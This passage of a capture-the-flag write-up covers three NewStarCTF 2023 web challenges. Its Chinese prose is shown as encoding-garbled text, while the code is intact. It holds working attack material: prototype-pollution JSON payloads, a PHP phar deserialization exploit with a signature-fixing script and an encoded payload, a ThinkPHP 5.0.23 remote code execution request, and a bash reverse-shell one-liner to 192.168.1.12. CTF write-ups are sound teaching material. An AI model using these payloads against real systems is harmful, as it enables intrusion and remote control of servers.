<p>å½“<code>createDate</code>çš„<code>opts</code>æœªæŒ‡å®šæ—¶å¹¶ä¸èƒ½æ³¨å…¥ï¼Œä½†æ˜¯å½“<code>opts</code>ä¸º JSON å¯¹è±¡ä¸”æ²¡æœ‰æŒ‡å®š<code>format</code>å±æ€§æ—¶ï¼Œä¸‹é¢è¿™ä¸€è¡Œä¼šè§¦å‘åŸå‹é“¾</p>
<pre><code class="hljs json">opts.format = opts.format || CopiedDefaultOptions.format;</code></pre>
<p>è€Œå¯¹äº<code>baseDate</code>ï¼Œç”±äº<code>DEFAULT_CREATE_DATE_OPTIONS</code>ä¸­æœ¬èº«ä¸å«<code>baseDate</code>ï¼Œå¯ç›´æ¥è§¦å‘è¯¥åŸå‹é“¾</p>
<pre><code class="hljs plaintext">opts.baseDate = new Date(opts.baseDate || Date.now());</code></pre>
<p>è¿™é‡Œç»è¿‡GPTä¸wpçš„å–‚å…»ï¼Œä¼¼ä¹æ‡‚äº†é‚£ä¹ˆä¸€ä¸¢ä¸¢ã€‚ã€‚ã€‚ã€‚</p>
<p><strong>æ—¶é—´å‡½æ•°æ³¨å…¥ç‚¹</strong></p>
<p>åœ¨<code>utility functions</code>çš„æ³¨é‡Šéƒ¨åˆ†å­˜åœ¨å‡½æ•°</p>
<pre><code class="hljs json">const getHMS = (time) =&gt; <span class="hljs-punctuation">{</span>
    <span class="hljs-comment">//ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹è¾“å…¥çš„ time è¿›è¡ŒåŒ¹é…ã€‚è¯¥æ­£åˆ™è¡¨è¾¾å¼ç”¨äºåŒ¹é…æ—¶é—´å­—ç¬¦ä¸²ï¼Œæ”¯æŒæ—¶ã€åˆ†ã€ç§’å’Œæ¯«ç§’çš„æå–ã€‚</span>
    let regres = /^(\d+) *\<span class="hljs-punctuation">:</span> *(\d+)( *\<span class="hljs-punctuation">:</span> *(\d+)( *\. *(\d+))?)?$/.exec(time.trim())
    if (regres === <span class="hljs-literal"><span class="hljs-keyword">null</span></span>) return <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span>
    <span class="hljs-comment">//ä½¿ç”¨è§£æ„èµ‹å€¼å’Œ map å‡½æ•°æå–æ­£åˆ™åŒ¹é…ç»“æœä¸­çš„æ•°å­—éƒ¨åˆ†ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºæ•°å­—ç±»å‹ã€‚å¦‚æœæŸä¸ªæ•°å­—æœªå®šä¹‰ï¼Œå°†å…¶è®¾ç½®ä¸º undefinedã€‚</span>
    let <span class="hljs-punctuation">[</span>n1<span class="hljs-punctuation">,</span> n2<span class="hljs-punctuation">,</span> n3<span class="hljs-punctuation">,</span> n4<span class="hljs-punctuation">]</span> = <span class="hljs-punctuation">[</span>regres<span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> regres<span class="hljs-punctuation">[</span><span class="hljs-number">2</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> regres<span class="hljs-punctuation">[</span><span class="hljs-number">4</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> regres<span class="hljs-punctuation">[</span><span class="hljs-number">6</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span>.map(t =&gt; typeof t === <span class="hljs-string">"undefined"</span> ? undefined <span class="hljs-punctuation">:</span> Number(t));
    if (typeof n3 === <span class="hljs-string">"undefined"</span>) n3 = <span class="hljs-number">0</span>; <span class="hljs-comment">// 23:59(:59)?</span>
    if (<span class="hljs-number">0</span> &lt;= n1 &amp;&amp; n1 &lt;= <span class="hljs-number">23</span> &amp;&amp; <span class="hljs-number">0</span> &lt;= n2 &amp;&amp; n2 &lt;= <span class="hljs-number">59</span> &amp;&amp; <span class="hljs-number">0</span> &lt;= n3 &amp;&amp; n3 &lt;= <span class="hljs-number">59</span>) <span class="hljs-punctuation">{</span>
        <span class="hljs-comment">// 23:59:59(.999)?</span>
        <span class="hljs-comment">//ä½¿ç”¨ pad å‡½æ•°å°†æ—¶ã€åˆ†ã€ç§’æ ¼å¼åŒ–ä¸ºä¸¤ä½æ•°ã€‚</span>
        let HH = pad(n1<span class="hljs-punctuation">,</span> <span class="hljs-number">2</span>)<span class="hljs-punctuation">,</span> mm = pad(n2<span class="hljs-punctuation">,</span> <span class="hljs-number">2</span>)<span class="hljs-punctuation">,</span> ss = pad(n3<span class="hljs-punctuation">,</span> <span class="hljs-number">2</span>)<span class="hljs-punctuation">,</span>
            <span class="hljs-comment">//å¦‚æœæ¯«ç§’éƒ¨åˆ†å­˜åœ¨ï¼Œå°†å…¶æ ¼å¼åŒ–å¹¶æ·»åŠ åˆ°ç»“æœå¯¹è±¡ä¸­ã€‚</span>
            fff = typeof n4 === <span class="hljs-string">"undefined"</span> ? undefined <span class="hljs-punctuation">:</span> pad(n4<span class="hljs-punctuation">,</span> <span class="hljs-number">3</span>).substring(<span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-number">3</span>);
        const o = <span class="hljs-punctuation">{</span> HH<span class="hljs-punctuation">,</span> mm<span class="hljs-punctuation">,</span> ss <span class="hljs-punctuation">}</span>
        <span class="hljs-comment">//è¿”å›ä¸€ä¸ªåŒ…å«æ—¶ã€åˆ†ã€ç§’ï¼ˆå’Œå¯èƒ½çš„æ¯«ç§’ï¼‰ä¿¡æ¯çš„å¯¹è±¡ã€‚</span>
        if (typeof fff !== <span class="hljs-string">"undefined"</span>) o.fff = fff;
        return o;
    <span class="hljs-punctuation">}</span> else return <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span></code></pre>
<p>å½“ä¼ å…¥çš„ä¼ å…¥<code>time</code>ä¸­ä¸åŒ…å«æ¯«ç§’æ—¶ï¼Œè¿”å›çš„å¯¹è±¡ä¸­ä¸ä¼šå¸¦æœ‰<code>fff</code>å±æ€§</p>
<p>è°ƒç”¨<code>getHMS</code>å‡½æ•°çš„åœ°æ–¹åœ¨<code>createDate</code>çš„æœ«å°¾å‡ è¡Œï¼Œå±äº<code>createDate</code>çš„ Fallback Auto Detection éƒ¨åˆ†</p>
<pre><code class="hljs plaintext">const { HH, mm, ss, fff } = getHMS(time_str)</code></pre>
<p>å½“<code>time_str</code>ä¸­ä¸åŒ…å«æ¯«ç§’ï¼Œèƒ½å¤Ÿè§¦å‘åŸå‹é“¾</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•åˆ©ç”¨æ¼æ´çš„é—®é¢˜äº†</p>
<p>æˆ‘ä»¬å‘ç°<code>createDate</code>çš„<code>opts</code>çš„<code>format</code>æ”¯æŒ<code>yy</code>æ ‡è¯†ç¬¦ï¼Œè€Œå½“å¹´ä»½å°äº100æ—¶ï¼Œæˆ‘ä»¬è®¤ä¸ºæ˜¯20ä¸–çºªçš„å¹´ä»½ï¼Œå¦‚ä¸‹å›¾</p>
<p>![image-20231110174102902](NewStarCTF 2023/image-20231110174102902.png)</p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœ<code>format</code>ä¸º<code>20yy-MM-dd</code>ï¼Œåœ¨<code>format</code>è§£æå­—ç¬¦ä¸²<code>2023-10-01</code>æ—¶ï¼Œå°†è§£æ<code>yy</code>ä¸º<code>23</code>ï¼Œè¾“å‡ºä¸º<code>1923</code>ï¼Œæœ€ç»ˆè¾“å‡ºçš„å¹´ä»½æ˜¯<code>1923-10-01</code></p>
<p>**ç›®æ ‡ï¼š**æ±¡æŸ“<code>format</code></p>
<p>å‰é¢æåˆ°ï¼Œæ±¡æŸ“<code>format</code>çš„æ¡ä»¶æ˜¯<code>opts</code>ä¸º JSON å¯¹è±¡ä¸”æ²¡æœ‰æŒ‡å®š<code>format</code>å±æ€§ï¼Œè§‚å¯Ÿ<code>routes/info</code>ä¸­çš„ç›¸åº”ç‰‡æ®µï¼Œæˆ‘ä»¬éœ€è¦è§¦å‘ä¸‹é¢çš„<code>catch</code></p>
<pre><code class="hljs javascript"><span class="hljs-keyword">try</span> {
    minTimestamp = <span class="hljs-title function_">createDate</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Number</span>.<span class="hljs-title function_">isSafeInteger</span>(minTimestamp)) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Invalid configuration min_public_time."</span>);
} <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`\x1b[33m<span class="hljs-subst">${e.message}</span>\x1b[0m`</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`Try using default value <span class="hljs-subst">${DEFAULT_CONFIG.min_public_time}</span>.`</span>);
    minTimestamp = <span class="hljs-title function_">createDate</span>(<span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>, { <span class="hljs-attr">UTC</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">baseDate</span>: <span class="hljs-title class_">LauchTime</span> }).<span class="hljs-title function_">getTime</span>();
}</code></pre>
<p>è§¦å‘<code>catch</code>çš„æ¡ä»¶æ˜¯å‰é¢<code>try</code>çš„<code>createDate</code>è¿”å›ä¸€ä¸ªæ— æ•ˆçš„æ—¥æœŸï¼Œæˆ–è€…<code>createDate</code>æœ¬èº«è¢«è°ƒç”¨æ—¶æ³•ç¥é”™è¯¯</p>
<p>**ç›®æ ‡ï¼š**è§¦å‘<code>createDate</code>é”™è¯¯ï¼Œæˆ–ä½¿<code>createDate</code>è¿”å›æ— æ•ˆæ—¥æœŸ</p>
<p>éœ€è¦åˆ©ç”¨åˆšæ‰å‰©ä½™çš„ä¸¤ä¸ªæ³¨å…¥ç‚¹</p>
<p>ä¸‹é¢çš„è¿™è¡Œä»£ç è¡¨æ˜äº†åŸºäº<code>format</code>çš„æ—¥æœŸåŒ¹é…ä¸å¯èƒ½è¿”å›ä¸€ä¸ªæ— æ•ˆæ—¥æœŸï¼Œå› æ­¤è¿”å›æ— æ•ˆæ—¥æœŸåªæœ‰ Fallback Auto Detection èƒ½å¤Ÿåšåˆ°</p>
<pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-title class_">Number</span>.<span class="hljs-title function_">isSafeInteger</span>(d.<span class="hljs-title function_">getTime</span>())) <span class="hljs-keyword">return</span> d;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;</code></pre>
<p>ä»å¦‚ä¸‹ä»£ç ç‰‡æ®µå¯çŸ¥ï¼ŒåŸºäº<code>format</code>çš„æ—¥æœŸåŒ¹é…ä¾èµ–äº<code>baseDate</code>ï¼Œformat çš„è¿‡ç¨‹æ˜¯åœ¨<code>argTable</code>ä¸Šè¿›è¡Œè¦†ç›–</p>
<pre><code class="hljs javascript"><span class="hljs-keyword">const</span> dateObj = opts.<span class="hljs-property">baseDate</span>
<span class="hljs-keyword">const</span> _UTC = opts.<span class="hljs-property">UTC</span> ? <span class="hljs-string">"UTC"</span> : <span class="hljs-string">""</span>
<span class="hljs-keyword">let</span> argTable = {
    <span class="hljs-string">"yyyy"</span>: dateObj[<span class="hljs-string">`get<span class="hljs-subst">${_UTC}</span>FullYear`</span>](),
    <span class="hljs-string">"MM"</span>: dateObj[<span class="hljs-string">`get<span class="hljs-subst">${_UTC}</span>Month`</span>]() + <span class="hljs-number">1</span>,
    <span class="hljs-string">"dd"</span>: dateObj[<span class="hljs-string">`get<span class="hljs-subst">${_UTC}</span>Date`</span>](),
    <span class="hljs-string">"HH"</span>: dateObj[<span class="hljs-string">`get<span class="hljs-subst">${_UTC}</span>Hours`</span>](),
    <span class="hljs-string">"mm"</span>: dateObj[<span class="hljs-string">`get<span class="hljs-subst">${_UTC}</span>Minutes`</span>](),
    <span class="hljs-string">"ss"</span>: dateObj[<span class="hljs-string">`get<span class="hljs-subst">${_UTC}</span>Seconds`</span>](),
    <span class="hljs-string">"fff"</span>: dateObj[<span class="hljs-string">`get<span class="hljs-subst">${_UTC}</span>Milliseconds`</span>] ? dateObj[<span class="hljs-string">`get<span class="hljs-subst">${_UTC}</span>Milliseconds`</span>]() : <span class="hljs-literal">undefined</span> <span class="hljs-comment">// due to system architecture</span>
}
sortTable.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">f, i</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (f == <span class="hljs-string">"yy"</span>) {
        <span class="hljs-keyword">let</span> year = <span class="hljs-title class_">Number</span>(regres[i + <span class="hljs-number">1</span>])
        year = year &lt; <span class="hljs-number">100</span> ? (<span class="hljs-number">1900</span> + year) : year;
        <span class="hljs-keyword">return</span> argTable[<span class="hljs-string">"yyyy"</span>] = year;
    }
    argTable[f] = <span class="hljs-title class_">Number</span>(regres[i + <span class="hljs-number">1</span>])
})</code></pre>
<p>å› æ­¤æ±¡æŸ“<code>baseDate</code>ä¸ºæ— æ•ˆæ—¥æœŸå³å¯ç»•è¿‡ format æ¨¡å¼è¿›å…¥ Fallback Auto Detection</p>
<p><code>routes/info.js</code>çš„<code>try</code>ä¸­ç”¨çš„æ˜¯<code>config.js</code>ä¸­çš„<code>min_pulic_time</code>ï¼Œä¸º<code>2019-07-09 00:00:00</code>ï¼Œä¸å¸¦æœ‰æ¯«ç§’ï¼Œåˆšå¥½èƒ½å¤Ÿè§¦å‘<code>fff</code>çš„åŸå‹é“¾æ±¡æŸ“ï¼Œä¸º<code>fff</code>æŒ‡å®šä¸ºæ— æ•ˆå€¼å³å¯</p>
<p>åˆ°æ­¤ä¸ºæ­¢ï¼Œä½¿ç”¨å¦‚ä¸‹çš„ payload å¯ä»¥è§¦å‘<code>catch</code></p>
<pre><code class="hljs json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"reason"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"2"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"constructor"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"prototype"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"baseDate"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"aaa"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"fff"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"bbb"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span></code></pre>
<p>è¿›å…¥<code>catch</code>åï¼Œè¾¾åˆ°äº†æ±¡æŸ“<code>format</code>çš„æ¡ä»¶ï¼Œä½†æ˜¯<code>createDate</code>çš„å‚æ•°å˜æˆäº†<code>config.default.js</code>ä¸­çš„<code>min_public_time</code>ï¼Œä¸º<code>2019-07-08T16:00:00.000Z</code>ï¼Œå› æ­¤å¯ä»¥æ„é€ <code>format</code>ä¸º<code>yy19-MM-ddTHH:mm:ss.fffZ</code></p>
<p>ç„¶ååŸºäº<code>format</code>çš„æ—¥æœŸåŒ¹é…ä¼šè¿”å›<code>1920-07-08T16:00:00.000Z</code>çš„æ—¥æœŸï¼Œå·²ç»å°†<code>minTimestamp</code>ææ—©äº†è¿‘ä¸€ä¸ªä¸–çºªäº†</p>
<p>å› æ­¤æœ€ç»ˆçš„<code>payload</code>ä¸º</p>
<pre><code class="hljs json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"a"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"reason"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"a"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"constructor"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"prototype"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"format"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"yy19-MM-ddTHH:mm:ss.fffZ"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"baseDate"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"aaa"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"fff"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"bbb"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span></code></pre>
<p>ä»¥<code>Content-Type: application/json</code>çš„ Header ç”¨<code>POST</code>æ–¹æ³•å‘è·¯å¾„<code>/submit</code>è¯·æ±‚å³å¯</p>
<p>ç„¶åä¸ºæˆ‘ä»¬å†è¯·æ±‚<code>/info/0</code>ï¼Œæ‰¾åˆ°å«æœ‰ flag çš„ä¸€æ¡æ•°æ®</p>
<p>![image-20231110180027322](NewStarCTF 2023/image-20231110180027322.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week5web-unserialize-again">WEEK5|WEB-Unserialize Again</h2>
<p>![image-20231110203212897](NewStarCTF 2023/image-20231110203212897.png)</p>
<p>è®¿é—®é¦–é¡µæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç›´æ¥ä¸Šä¼ ä¸€ä¸ªå‘ç°æç¤ºæˆ‘ä»¬ï¼Œè¿™é‡Œä¸æ˜¯ä¸Šä¼ ç‚¹ï¼Œé‚£å³é”®çœ‹ä¸€ä¸‹æºä»£ç ï¼Œå‘ç°cookieä¸­è—æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®çœ‹åˆ°pharååºåˆ—åŒ–ä»£ç </p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">'admin'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">'false'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">'human'</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>){
            <span class="hljs-keyword">die</span>();
        }
        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>){
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;
        }
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">'AshenOne'</span>;
        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">'fire'</span>;
        <span class="hljs-keyword">die</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">'admin'</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">'admin'</span>){
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;
        }
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">'true'</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">'admin'</span>){
            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);
        }
        <span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Get Out!'</span>);
        }
    }
}                 
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pear'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'apple'</span>])){
    <span class="hljs-comment">// $Eden=new story();</span>
    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pear'</span>];
    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'apple'</span>];
    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'php://input'</span>);
    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));
    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'å¤šåƒé›ªæ¢¨'</span>;
} å¤šåƒé›ªæ¢¨</code></pre>
<p>è¿™é“é¢˜åˆ†æä¸‹æ¥ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯ç›´æ¥é¡ºåŠ¿è¿›å…¥destructé­”æœ¯æ–¹æ³•å³å¯ï¼Œè‡³äºwakeupçš„ç»•è¿‡å°±å¾ˆç®€å•äº†</p>
<p>![image-20231110204546036](NewStarCTF 2023/image-20231110204546036.png)</p>
<p>è¿™é‡Œä¹Ÿçœ‹åˆ°PHPæ˜¯7.0.9ï¼Œå¯ä»¥ç»•è¿‡wakeupçš„ï¼Œå°±åœ¨æˆ‘çº³é—·å„¿constructå’‹ç»•è¿‡æ—¶ï¼Œçœ‹äº†ä¸€ç¯‡æ–‡ç« æ‡µé€¼äº†ï¼Œååºåˆ—åŒ–ä¸è§¦å‘ã€‚ã€‚ã€‚ã€‚</p>
<p>æˆ‘å»ï¼Œæˆ‘ç«Ÿç„¶ä¸çŸ¥é“ã€‚ã€‚ã€‚é‚£æˆ‘ä»¬ç›´æ¥å†™pharå³å¯</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//ini_set("phar.readonly", 0);</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span> = <span class="hljs-string">'cat /f*'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">'true'</span>;
}

<span class="hljs-comment">//@unlink("phar.phar");</span>
<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"1.phar"</span>); <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">"&lt;?php __HALT_COMPILER();?&gt;"</span>); <span class="hljs-comment">//è®¾ç½®stub</span>
<span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>
<span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>ä¿®æ”¹å®Œä¹‹åï¼Œå› ä¸ºpharçš„æœ€åæœ‰ä¸€æ®µsignatureï¼Œæ˜¯pharçš„<strong>ç­¾å</strong>ï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œè¦æ³¨æ„å› ä¸ºæˆ‘ä»¬ä¿®æ”¹äº†æ–‡ä»¶çš„å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯ç»•è¿‡wakeæ—¶ä¿®æ”¹çš„å±æ€§ä¸ªæ•°ï¼‰ï¼Œä¹‹å‰çš„ç­¾åå°±ä¼šæ— æ•ˆï¼Œæ‰€ä»¥éœ€è¦<strong>æ›´æ¢ä¸€ä¸ªæ–°çš„ç­¾å</strong>ï¼Œç”Ÿæˆæ–°ç­¾åçš„è„šæœ¬å¦‚ä¸‹</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'1.phar'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:&nbsp;&nbsp;&nbsp; 
    f = file.read()
s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># è·å–è¦ç­¾åçš„æ•°æ®</span>
h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯†</span>
newf = s + sha1(s).digest() + h <span class="hljs-comment"># æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'newtest.phar'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> file:&nbsp;&nbsp;&nbsp; 
    file.write(newf) <span class="hljs-comment"># å†™å…¥æ–°æ–‡ä»¶</span></code></pre>
<p>æœ€åè¯»å– <code>newtest.phar</code> çš„å†…å®¹è¿›è¡Œurlç¼–ç postä¼ ä¸Šå»ï¼Œgetä¼  <code>?pear=1.phar&amp;apple=phar://1.phar</code> å³å¯</p>
<p>![image-20231110205835163](NewStarCTF 2023/image-20231110205835163.png)</p>
<p>å¦‚å›¾æ­¤å¤„ä¿®æ”¹æ”¹å˜2çš„å€¼</p>
<pre><code class="hljs plaintext">%3C%3Fphp%20__HALT_COMPILER%28%29%3B%20%3F%3E%0D%0Av%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%40%00%00%00O%3A5%3A%22story%22%3A3%3A%7Bs%3A6%3A%22eating%22%3Bs%3A7%3A%22cat%20/f%2A%22%3Bs%3A3%3A%22God%22%3Bs%3A4%3A%22true%22%3B%7D%08%00%00%00test.txt%04%00%00%00%E7%28Ne%04%00%00%00%0C~%7F%D8%B6%01%00%00%00%00%00%00test%F3nV%C6%07%A7%D9%96%86%CC%1A%95%19%CE3%DA%DC%0A%21-%02%00%00%00GBMB</code></pre>
<p>![image-20231110210513035](NewStarCTF 2023/image-20231110210513035.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week5web-final">WEEK5|WEB-Final</h2>
<p>è¿™é‡Œè®¿é—®é¦–é¡µå‘ç°æ˜¯thinkphpæ¡†æ¶ï¼Œé‚£æˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£å…¶ç‰ˆæœ¬ï¼Œç›´æ¥urlåé¢æ‹¼æ¥ä»»æ„å­—ç¬¦ï¼Œä½¿å…¶æŠ¥é”™è€Œæ³„éœ²ç‰ˆæœ¬ä¿¡æ¯</p>
<p>![image-20231111090429701](NewStarCTF 2023/image-20231111090429701.png)</p>
<p>å¦‚ä¸Šå›¾ä¸º5.0.23-å¯¹åº”çš„æ˜¯è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œç›´æ¥ä¸Šé€šç”¨payloadï¼š</p>
<pre><code class="hljs http">/index.php?s=captcha 

<span class="hljs-attribute">POST</span><span class="hljs-punctuation">: </span>_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5</code></pre>
<p>å¦‚ä¸‹å›¾ï¼Œå‘ç°systemè¢«ç¦ç”¨äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€‰æ‹©åå¼¹shellï¼Œå‡½æ•°å‘¢é€‰æ‹©execå³å¯</p>
<p>![image-20231111085326347](NewStarCTF 2023/image-20231111085326347.png)</p>
<pre><code class="hljs http">bash -i &gt;&amp; /dev/tcp/192.168.1.12/1234 0&gt;&amp;1

